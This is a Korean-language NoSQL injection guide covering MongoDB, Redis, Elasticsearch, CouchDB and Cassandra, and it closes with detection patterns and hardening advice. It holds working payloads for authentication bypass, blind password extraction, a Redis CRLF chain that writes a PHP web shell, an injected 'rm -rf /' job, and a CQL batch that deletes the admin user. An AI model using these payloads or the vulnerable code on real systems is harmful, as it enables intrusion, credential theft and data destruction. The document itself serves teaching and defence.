# NoSQL Injection 완전 정복

> NoSQL 데이터베이스 인젝션 기법 상세
> 버전: 1.0
> 최종 수정: 2025-01-26

---

## 목차

1. [NoSQL Injection 개요](#1-nosql-injection-개요)
2. [MongoDB Injection](#2-mongodb-injection)
3. [Redis Injection](#3-redis-injection)
4. [Elasticsearch Injection](#4-elasticsearch-injection)
5. [CouchDB Injection](#5-couchdb-injection)
6. [Cassandra Injection](#6-cassandra-injection)
7. [탐지 및 방어](#7-탐지-및-방어)

---

## 1. NoSQL Injection 개요

### 1.1 NoSQL vs SQL Injection

```
┌─────────────────────────────────────────────────────────────┐
│                  NoSQL vs SQL Injection                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  SQL Injection:                                             │
│  ├─ SQL 문법 기반                                           │
│  ├─ 문자열 연결 취약점                                      │
│  └─ 표준화된 공격 패턴                                      │
│                                                              │
│  NoSQL Injection:                                           │
│  ├─ 다양한 쿼리 언어 (JSON, JavaScript, 등)                │
│  ├─ 타입 조작 취약점 (Object vs String)                    │
│  ├─ 연산자 주입 ($ne, $gt, $regex 등)                      │
│  └─ DBMS별 완전히 다른 공격 패턴                           │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

### 1.2 NoSQL Injection 유형

```yaml
injection_types:
  # 1. 연산자 주입 (Operator Injection)
  operator_injection:
    description: "쿼리 연산자를 주입하여 로직 변경"
    example: '{"$ne": ""}'
    target: "MongoDB, CouchDB"

  # 2. JavaScript 주입
  javascript_injection:
    description: "서버사이드 JS 실행"
    example: "function() { return true; }"
    target: "MongoDB ($where), CouchDB"

  # 3. 타입 조작 (Type Juggling)
  type_juggling:
    description: "문자열 대신 객체 전달"
    example: "username[]=admin"
    target: "모든 NoSQL"

  # 4. 피기백 쿼리 (Piggybacked Query)
  piggybacked:
    description: "추가 명령 주입"
    example: "key\r\nSET injected value"
    target: "Redis"

  # 5. 블라인드 인젝션
  blind_injection:
    description: "조건부 응답 차이 이용"
    example: '{"$regex": "^a.*"}'
    target: "MongoDB"
```

### 1.3 취약한 코드 패턴

```javascript
// 취약한 패턴 (Node.js + MongoDB)
app.post('/login', (req, res) => {
  // req.body가 객체로 파싱되면 연산자 주입 가능
  db.users.findOne({
    username: req.body.username,  // {"$ne": ""} 가능
    password: req.body.password   // {"$ne": ""} 가능
  });
});

// 공격 요청
// POST /login
// Content-Type: application/json
// {"username": {"$ne": ""}, "password": {"$ne": ""}}
// → 모든 사용자 매칭 (인증 우회)
```

---

## 2. MongoDB Injection

### 2.1 연산자 주입 (Operator Injection)

```yaml
mongodb_operators:
  # 비교 연산자
  comparison:
    $eq: "같음"
    $ne: "같지 않음 (인증 우회에 사용)"
    $gt: "초과"
    $gte: "이상"
    $lt: "미만"
    $lte: "이하"
    $in: "배열 내 존재"
    $nin: "배열 내 미존재"

  # 논리 연산자
  logical:
    $and: "AND 조건"
    $or: "OR 조건"
    $not: "NOT 조건"
    $nor: "NOR 조건"

  # 요소 연산자
  element:
    $exists: "필드 존재 여부"
    $type: "필드 타입"

  # 평가 연산자 (위험!)
  evaluation:
    $regex: "정규식 매칭 (Blind에 사용)"
    $where: "JavaScript 실행 (매우 위험)"
    $expr: "집계 표현식"
```

**인증 우회 공격:**
```javascript
// 정상 로그인
{"username": "admin", "password": "secret123"}

// 공격 1: $ne 연산자
{"username": "admin", "password": {"$ne": ""}}
// → password != "" 이면 참 (모든 비밀번호 매칭)

// 공격 2: $gt 연산자
{"username": "admin", "password": {"$gt": ""}}
// → password > "" 이면 참

// 공격 3: $regex 연산자
{"username": "admin", "password": {"$regex": ".*"}}
// → 모든 문자열 매칭

// 공격 4: $or 연산자 (사용자 열거)
{"$or": [{"username": "admin"}, {"username": "root"}], "password": {"$ne": ""}}
```

### 2.2 $where JavaScript 주입

```javascript
// 취약한 코드
db.users.find({$where: "this.username == '" + userInput + "'"});

// 공격 페이로드
// userInput = "admin' || 'a'=='a"
// 결과: this.username == 'admin' || 'a'=='a'  → 항상 참

// 시간 기반 Blind
// userInput = "admin' && sleep(5000) && 'a'=='a"
// 5초 지연으로 조건 확인

// 데이터 추출
// userInput = "admin' && this.password.match(/^a.*/) && 'a'=='a"
// 비밀번호 첫 글자 확인
```

**$where Blind Injection:**
```javascript
// 비밀번호 길이 확인
"admin' && this.password.length == 8 && 'a'=='a"

// 비밀번호 한 글자씩 추출
"admin' && this.password[0] == 's' && 'a'=='a"
"admin' && this.password[1] == 'e' && 'a'=='a"
// ...

// 정규식 활용
"admin' && this.password.match(/^sec.*/) && 'a'=='a"
```

### 2.3 $regex Blind Injection

```yaml
regex_blind_extraction:
  description: "$regex로 문자 하나씩 추출"

  # 첫 번째 문자 확인
  step_1:
    payload: '{"username": "admin", "password": {"$regex": "^a"}}'
    result: "응답 차이로 첫 글자 확인"

  # 두 번째 문자 확인
  step_2:
    payload: '{"username": "admin", "password": {"$regex": "^se"}}'
    result: "첫 글자가 's'였다면 두 번째 확인"

  # 전체 추출 알고리즘
  algorithm: |
    for each position:
      for each char in [a-zA-Z0-9...]:
        if response_differs({"$regex": "^" + known + char}):
          known += char
          break

  # 최적화: 이진 탐색 불가 (정규식 특성)
  optimization: |
    - 문자 집합 축소 (알파벳만, 숫자만 등)
    - 대소문자 무시 옵션: {"$regex": "^A", "$options": "i"}
```

### 2.4 MongoDB 집계 파이프라인 주입

```javascript
// 취약한 집계 쿼리
db.users.aggregate([
  { $match: { status: userInput } }
]);

// 공격: 파이프라인 주입
// userInput = {"$ne": ""}, {"$project": {"password": 1}}
// → 비밀번호 필드 노출

// $lookup을 통한 다른 컬렉션 접근
{
  "$lookup": {
    "from": "admin_users",
    "localField": "_id",
    "foreignField": "_id",
    "as": "admin_data"
  }
}
```

### 2.5 MongoDB 특수 기능 악용

```javascript
// mapReduce 주입 (서버사이드 JS)
db.users.mapReduce(
  function() { emit(this.username, this.password); },  // 주입 가능
  function(key, values) { return values[0]; },
  { out: "pwned" }
);

// $accumulator (MongoDB 4.4+)
{
  "$group": {
    "_id": null,
    "data": {
      "$accumulator": {
        "init": "function() { return []; }",
        "accumulate": "function(state, pw) { return state.concat(pw); }",
        "accumulateArgs": ["$password"],
        "merge": "function(s1, s2) { return s1.concat(s2); }",
        "finalize": "function(state) { return state; }"
      }
    }
  }
}
```

---

## 3. Redis Injection

### 3.1 Redis 명령 주입

```
┌─────────────────────────────────────────────────────────────┐
│                    Redis Injection 원리                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  Redis: 키-값 저장소, 텍스트 프로토콜                       │
│  취약점: 입력이 명령어의 일부로 해석됨                      │
│                                                              │
│  정상: GET user:admin                                       │
│  주입: GET user:admin\r\nSET injected value                │
│        → 두 개의 명령 실행                                  │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

**CRLF 주입:**
```python
# 취약한 코드
def get_user(username):
    return redis.execute_command(f"GET user:{username}")

# 공격
# username = "admin\r\nCONFIG SET dir /var/www/html"
# → GET user:admin
# → CONFIG SET dir /var/www/html

# 웹쉘 업로드
# username = "admin\r\nCONFIG SET dbfilename shell.php\r\nSET payload '<?php system($_GET[c]); ?>'\r\nSAVE"
```

### 3.2 Redis Lua 스크립트 주입

```lua
-- 취약한 Lua 스크립트 실행
EVAL "return redis.call('GET', 'user:' .. ARGV[1])" 0 "admin"

-- 주입: ARGV[1] = "admin') return redis.call('KEYS', '*') --"
-- 모든 키 목록 노출

-- 더 위험한 주입
-- ARGV[1] = "x'); os.execute('id'); return redis.call('GET', 'x"
-- (일반적으로 비활성화되어 있음)
```

### 3.3 Redis 데이터 조작

```yaml
redis_attacks:
  # 세션 하이재킹
  session_hijack:
    attack: "SET session:attacker_session admin_session_data"
    impact: "관리자 세션 탈취"

  # 캐시 포이즈닝
  cache_poisoning:
    attack: "SET cache:user:1 '{\"role\": \"admin\"}'"
    impact: "권한 상승"

  # 큐 조작
  queue_manipulation:
    attack: "LPUSH job_queue '{\"task\": \"rm -rf /\"}'"
    impact: "백그라운드 작업 주입"

  # Pub/Sub 악용
  pubsub_abuse:
    attack: "PUBLISH events '{\"type\": \"admin_created\"}'"
    impact: "이벤트 위조"
```

---

## 4. Elasticsearch Injection

### 4.1 쿼리 DSL 주입

```json
// 정상 검색 쿼리
{
  "query": {
    "match": {
      "content": "user_input"
    }
  }
}

// 취약한 동적 쿼리 생성
query = f'{{"query": {{"match": {{"content": "{user_input}"}}}}}}'

// 공격: user_input = '"}}}}, "script_fields": {"pwned": {"script": "doc[\'password\'].value"}}, "query": {"match_all": {'
// 결과: script_fields로 민감 데이터 추출
```

### 4.2 스크립트 주입

```json
// Painless 스크립트 주입
{
  "query": {
    "bool": {
      "filter": {
        "script": {
          "script": {
            "source": "doc['status'].value == 'INJECTED_VALUE'"
          }
        }
      }
    }
  }
}

// 공격: INJECTED_VALUE = "active'; return true; //"
// → 스크립트 로직 변경

// 데이터 추출 스크립트
{
  "script_fields": {
    "extracted": {
      "script": {
        "source": "doc['password'].value"
      }
    }
  }
}
```

### 4.3 와일드카드/정규식 DoS

```json
// ReDoS (Regular Expression DoS)
{
  "query": {
    "regexp": {
      "content": "(a+)+$"  // 백트래킹 폭발
    }
  }
}

// 와일드카드 DoS
{
  "query": {
    "wildcard": {
      "content": "*a*a*a*a*a*a*a*"
    }
  }
}
```

---

## 5. CouchDB Injection

### 5.1 Mango 쿼리 주입

```json
// 정상 쿼리
{
  "selector": {
    "username": "admin",
    "password": "secret"
  }
}

// 연산자 주입
{
  "selector": {
    "username": "admin",
    "password": {"$ne": ""}
  }
}

// $or 주입
{
  "selector": {
    "$or": [
      {"username": "admin"},
      {"role": "admin"}
    ]
  }
}
```

### 5.2 View 함수 주입

```javascript
// CouchDB View (JavaScript)
function(doc) {
  if (doc.type == 'user') {
    emit(doc.username, doc.password);  // 민감 데이터 노출
  }
}

// 설계 문서 주입 (관리자 권한 필요)
{
  "_id": "_design/malicious",
  "views": {
    "extract": {
      "map": "function(doc) { emit(doc._id, doc); }"
    }
  }
}
```

---

## 6. Cassandra Injection

### 6.1 CQL Injection

```sql
-- Cassandra Query Language (SQL과 유사)

-- 취약한 쿼리
SELECT * FROM users WHERE username = 'USER_INPUT';

-- 공격: USER_INPUT = admin' OR ''='
-- 결과: SELECT * FROM users WHERE username = 'admin' OR ''='';

-- Cassandra 특이점
-- 1. 서브쿼리 미지원 → UNION 불가
-- 2. 주석 구문 다름 (-- 대신 //, /* */)
-- 3. ALLOW FILTERING 필요한 경우 있음
```

### 6.2 Batch 문 주입

```sql
-- 배치 문 주입
-- 원본: INSERT INTO logs (id, message) VALUES (uuid(), 'USER_INPUT');

-- 공격: USER_INPUT = test'); DELETE FROM users WHERE username = 'admin' //
BEGIN BATCH
  INSERT INTO logs (id, message) VALUES (uuid(), 'test');
  DELETE FROM users WHERE username = 'admin';
APPLY BATCH;
```

---

## 7. 탐지 및 방어

### 7.1 NoSQL Injection 탐지

```yaml
detection_patterns:
  # MongoDB 연산자 패턴
  mongodb_operators:
    patterns:
      - '"\$ne"'
      - '"\$gt"'
      - '"\$lt"'
      - '"\$regex"'
      - '"\$where"'
      - '"\$or"'
      - '"\$and"'
    context: "JSON 본문 내"

  # 타입 조작 패턴
  type_juggling:
    patterns:
      - 'param\[\]='
      - 'param\[key\]='
    context: "URL 파라미터"

  # Redis CRLF
  redis_crlf:
    patterns:
      - '%0d%0a'
      - '\r\n'
      - '%0a'
    context: "모든 입력"

  # Elasticsearch 스크립트
  elasticsearch_script:
    patterns:
      - '"script"'
      - '"script_fields"'
      - 'painless'
    context: "JSON 쿼리"
```

### 7.2 방어 전략

```yaml
defense_strategies:
  # 1. 입력 타입 강제
  type_enforcement:
    description: "객체 대신 문자열만 허용"
    example: |
      // 취약
      db.find({ username: req.body.username });

      // 안전
      db.find({ username: String(req.body.username) });

  # 2. 허용 목록 (Whitelist)
  whitelist:
    description: "허용된 연산자만 사용"
    example: |
      const allowedOps = ['$eq', '$in'];
      if (!allowedOps.includes(Object.keys(query)[0])) {
        throw new Error('Invalid operator');
      }

  # 3. 스키마 검증
  schema_validation:
    description: "입력 스키마 사전 정의"
    tools:
      - "Joi (Node.js)"
      - "Pydantic (Python)"
      - "JSON Schema"

  # 4. 파라미터화 (가능한 경우)
  parameterization:
    description: "쿼리 빌더 사용"
    example: |
      // Mongoose (Node.js)
      User.findOne().where('username').equals(input);

  # 5. 권한 최소화
  least_privilege:
    description: "DB 사용자 권한 제한"
    actions:
      - "읽기 전용 사용자 분리"
      - "$where, mapReduce 비활성화"
      - "관리 명령 제한"
```

### 7.3 DBMS별 보안 설정

```yaml
mongodb_hardening:
  - "net.security.javascriptEnabled: false  # $where 비활성화"
  - "RBAC 적용 (역할 기반 접근 제어)"
  - "네트워크 바인딩 제한 (127.0.0.1)"

redis_hardening:
  - "rename-command CONFIG ''  # 위험 명령 비활성화"
  - "rename-command EVAL ''"
  - "requirepass 설정"
  - "bind 127.0.0.1"

elasticsearch_hardening:
  - "script.allowed_types: none  # 스크립트 비활성화"
  - "xpack.security.enabled: true"
  - "네트워크 바인딩 제한"
```

---

## GR Framework 매핑

```yaml
nosql_injection_gr_mapping:
  occurrence:
    layer: "L7"  # Application Layer
    zone: "Zone3-4"

  impact:
    layer: "L5"  # Data Layer
    zone: "Zone4-5"

  tags:
    - "A-WEB-API"
    - "D-DB-NOSQL"
    - "S-VUL-INJ"

  cwe:
    - id: "CWE-943"
      name: "Improper Neutralization of Special Elements in Data Query Logic"
```

---

> **이전 문서**: 05_DBMS_MSSQL.md
> **관련 문서**: 01_SQLi_Complete_Guide.md (SQLi 기초)
